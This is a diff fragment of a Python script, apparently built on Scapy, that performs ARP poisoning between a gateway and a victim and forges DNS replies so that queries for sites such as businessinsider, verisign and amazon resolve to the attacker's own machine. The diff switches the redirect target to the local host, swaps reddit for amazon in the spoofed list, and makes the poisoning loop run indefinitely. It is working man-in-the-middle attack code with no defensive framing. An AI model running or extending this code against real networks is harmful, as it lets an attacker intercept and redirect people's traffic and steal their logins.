@@ -75,15 +75,12 @@ def blacklist(packet, spoofs):
       return True
   return False
 
-destIP = socket.gethostbyname('reddit.com')
+destIP = socket.gethostbyname(socket.gethostname()) #socket.gethostbyname('reddit.com')
 def dns_spoof(dns_pkt):
-  spoofed_sites = ['businessinsider'.encode(), 'verisign'.encode(), 'reddit'.encode()] # only spoof small set of websites
+  spoofed_sites = ['businessinsider'.encode(), 'verisign'.encode(), 'amazon'.encode()] # only spoof small set of websites
   ip = dns_pkt[IP]
   dns = dns_pkt[DNS]
   query = dns.qd
-  
-  #print(socket.gethostbyname(socket.gethostname()))
-  #print(destIP)
 
   #if blacklist(dns_pkt, spoofed_sites):
   spoof = Ether(dst=dns_pkt[Ether].src)/IP(src=ip.dst,dst=ip.src)/UDP(sport=ip.dport,dport=ip.sport)/\
@@ -157,9 +154,9 @@ def mitm():
     sys.exit(1)
 
   print("[*] Poisoning Targets...")
-  run = True
+
   local_host = socket.gethostbyname(socket.gethostname())
-  while run:
+  while True:
     try:
       trick(gate_mac, victim_mac)
 
